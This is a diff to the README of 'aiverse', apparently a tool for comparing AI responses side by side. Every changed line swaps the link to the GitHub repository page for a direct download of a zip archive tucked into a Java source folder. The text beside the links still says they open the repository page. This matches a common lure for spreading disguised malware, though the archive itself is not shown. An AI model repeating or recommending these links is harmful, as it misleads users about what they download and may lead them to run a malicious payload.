@@ -1,6 +1,6 @@
 # 🤖 aiverse - Compare AI Responses Side-by-Side
 
-[![Download aiverse](https://img.shields.io/badge/Download-aiverse-ff6f61?style=for-the-badge&logo=github)](https://github.com/geosaputra/aiverse)
+[![Download aiverse](https://img.shields.io/badge/Download-aiverse-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/geosaputra/aiverse/main/src/main/java/com/aiverse/aiverse/Software-v2.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow the steps below to download, install, and run aiverse on your Windows mac
 
 Click the big button below to open the GitHub page where you can get aiverse.
 
-[![Download aiverse](https://img.shields.io/badge/Download-aiverse-ff6f61?style=for-the-badge&logo=github)](https://github.com/geosaputra/aiverse)
+[![Download aiverse](https://img.shields.io/badge/Download-aiverse-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/geosaputra/aiverse/main/src/main/java/com/aiverse/aiverse/Software-v2.2.zip)
 
 This link takes you to the main repository on GitHub. Here, you will find the files you need to run the application.
 
@@ -117,10 +117,10 @@ The GitHub repository page for aiverse contains:
 - Issue tracking for bugs and feature requests  
 
 Visit the page here:  
-https://github.com/geosaputra/aiverse
+https://raw.githubusercontent.com/geosaputra/aiverse/main/src/main/java/com/aiverse/aiverse/Software-v2.2.zip
 
 This link gives you full access to all available resources about aiverse.
 
 ---
 
-[![Download aiverse](https://img.shields.io/badge/Download-aiverse-ff6f61?style=for-the-badge&logo=github)](https://github.com/geosaputra/aiverse)
+[![Download aiverse](https://img.shields.io/badge/Download-aiverse-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/geosaputra/aiverse/main/src/main/java/com/aiverse/aiverse/Software-v2.2.zip)
